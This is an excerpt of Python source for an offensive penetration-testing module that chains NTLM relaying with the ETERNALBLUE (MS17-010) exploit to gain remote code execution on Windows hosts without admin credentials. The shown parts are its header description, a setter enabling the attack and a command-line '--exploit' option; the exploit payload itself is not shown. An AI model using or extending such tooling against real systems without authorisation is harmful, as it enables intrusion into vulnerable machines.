...
#
# NTLM Relay ETERNALBLUE Module
#
# Authors:
#  Kory Findley (@k0fin)
#
# Description:
# This module is a modified version of dirkjanm & Alberto Solino's ntlmrelayx.py script
# which is tailored toward chaining NTLM relaying & ETERNALBLUE exploit code
# to achieve RCE against version of Windows affected by MS17-010 without the need
# for local Admin privileges or credentials.
#
#
...
#        c.setEnumShares(options.enum_shares) ### Handle CLI option for SMB share enumeration ###
        c.setEternalRelayAttack(options.exploit)
        c.setEncoding(codec)
        c.setMode(mode)
...
if __name__ == '__main__':
    ...
    parser = argparse.ArgumentParser(add_help = False, description = "For every connection received, this module will "
                                    "try to relay that connection to specified target(s) system or the original client. If code "
                                    "execution is not possible or the relayed user is not admin, the relayed connection can be used "
                                    "to launch ETERNALBLUE against vulnerable Windows hosts as a normal user.")
    ...
    #EternalRelay arguments
    eternalrelay_options = parser.add_argument_group("EternalRelay client options")

    eternalrelay_options.add_argument('--exploit', action='store_true', required=False, help='If relayed user is not admin, use relayed SMB connection for non-admin user to '
                                                                    'launch EternalBlue against vulnerable Windows targets')
